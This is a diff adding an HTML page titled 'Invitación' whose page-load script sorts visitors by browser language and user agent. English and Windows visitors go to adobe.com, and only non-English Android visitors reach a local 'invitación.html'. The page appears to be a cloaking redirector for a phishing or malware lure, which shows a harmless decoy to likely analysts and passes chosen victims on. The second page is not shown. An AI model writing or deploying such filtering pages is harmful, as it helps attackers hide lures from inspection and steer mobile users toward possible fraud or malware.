@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> Invitación </title>
+ 
+  <script>
+    window.onload = function () {
+      const idioma = navigator.language || navigator.userLanguage;
+      const userAgent = navigator.userAgent.toLowerCase();
+
+      if (idioma.startsWith('en')) {
+        window.location.href = "https://www.adobe.com/";
+      } else if (userAgent.includes("windows")) {
+        window.location.href = "https://www.adobe.com/";
+      } else if (userAgent.includes("android")) {
+        window.location.href = "invitación.html";
+      } else {
+        window.location.href = "https://www.adobe.com/";
+      }
+    };
+  </script>
+
+</head>
+<body>
+  <p>  </p>
+ </body>
+</html>
